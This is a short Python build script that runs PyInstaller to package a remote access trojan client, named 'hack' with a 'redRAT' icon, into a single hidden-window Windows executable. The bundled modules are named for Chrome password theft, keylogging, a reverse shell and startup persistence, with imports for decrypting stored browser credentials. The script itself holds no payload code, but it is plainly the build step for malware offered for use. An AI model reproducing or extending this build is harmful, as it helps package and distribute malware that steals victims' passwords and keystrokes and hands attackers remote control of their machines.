import subprocess


subprocess.run("pyinstaller --noconfirm --onefile --windowed --icon 'C:/Users/20201260/Desktop/RAT/output/executables/redRAT.ico' --name 'hack' --add-data 'C:/Users/20201260/Desktop/RAT/src/client/__init__.py;.' --add-data 'C:/Users/20201260/Desktop/RAT/src/client/chrome_passwords.py;.' --add-data 'C:/Users/20201260/Desktop/RAT/src/client/connection.py;.' --add-data 'C:/Users/20201260/Desktop/RAT/src/client/keylogger.py;.' --add-data 'C:/Users/20201260/Desktop/RAT/src/client/rev_shell.py;.' --add-data 'C:/Users/20201260/Desktop/RAT/src/client/startup.py;.' --paths 'C:/Users/20201260/AppData/Local/Programs/Python/Python310/Lib/site-packages' --hidden-import 'pynput' --hidden-import 'ctypes' --hidden-import 'Cryptodome.Cipher.AES' --hidden-import 'win32crypt' --hidden-import 'sqlite3' --hidden-import 'json'  'C:/Users/20201260/Desktop/RAT/src/client/client_main.py'")